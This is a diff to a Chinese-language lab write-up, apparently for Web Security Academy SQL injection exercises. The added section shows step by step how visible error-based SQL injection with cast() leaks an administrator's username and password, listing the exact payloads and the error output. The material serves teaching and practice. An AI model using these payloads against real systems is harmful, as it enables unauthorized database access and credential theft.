@@ -109,3 +109,12 @@
 6. `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0)  end from dual)||'` 与 `TrackingId=xyz'||(select case when (1=1) then '' else to_char(1/0) end from dual)||'`: 通过是否报错确定盲注语句正确。
 7. `'||(select case when (1=1) then '' else to_char(1/0) end from users where username='administrator')||'` 与 `'||(select case when (length(password)>1) then '' else to_char(1/0) end from users where username='administrator')||'`: 确定`administrator`用户并使用intruder盲注密码长度。
 8. 进行密码盲注。
+
+## 13: Visible error-based SQL injection
+
+> 报错信息可见时，很多都比较方便。这里利用`cast()`函数直接将数据暴露出来。当然你也可以根据是否报错与上一题一样来解决，但既然有报错信息，那我们就可以利用这个信息显示直接暴露数据。
+
+1. `' and cast((select 1) as int)--` 与 `' and cast((select 1) as int)=1--`: 可以得到`500 Internal Server Error`与报错`ERROR: argument of AND must be type boolean, not type integer`与正常网页，可以确定有报错回显。
+2. `' and cast((select username from users) as int)=1--`: 你会得到报错`Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'xMV6MCazpBFu8ng4' and cast((select username from users) as i'. Expected  char`，这意味着后端进行了截取处理，我们需要缩短请求的数据，考虑到我们在试图使其进行报错，我们可以直接在TrackingId上动手脚，例如直接删掉或缩短为几个字符。
+3. `' and cast((select username from users limit 1) as int)=1--`: 报错`ERROR: invalid input syntax for type integer: "administrator"`中可以泄漏数据`administrator`，如果第一个数据不是`administrator`的话，可以考虑使用`limit 2,1`和`offset`等语法，不过我尝试后得到`limit #,# syntax is not supported`，使用`offset`显然会超过字符数限制。
+4. `' and cast((select password from users limit 1) as int)=1--`: 可以从报错`ERROR: invalid input syntax for type integer: "hvhf525whwj4k8uvhjny"`中提取密码。
